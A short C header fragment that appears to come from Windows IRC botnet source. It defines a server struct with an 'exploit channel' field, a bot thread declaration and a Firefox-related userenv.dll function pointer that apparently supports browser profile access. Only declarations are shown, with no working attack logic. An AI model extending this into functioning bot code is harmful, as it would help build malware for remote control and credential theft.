
typedef struct irc_server {
	char	host[MAX_HOSTNAME];			// The server host
	char	pass[16];					// The server password
	int		port;						// The server port
	char	chan[MAX_NICKLEN];			// The channel
	char	chanpass[16];				// The channel pass
	char	modeonconn[12];				// The modes to set on connect
	char	modeonjoin[12];				// The modes to set on op
	char	exploitchan[MAX_NICKLEN];	// The exploit channel
} SERVER;

DWORD WINAPI Bthd(LPVOID param);

#ifndef NO_FIREFOX
//userenv.dll function variables
typedef BOOL (__stdcall *GUPD)(HANDLE,LPTSTR,LPDWORD);
#endif 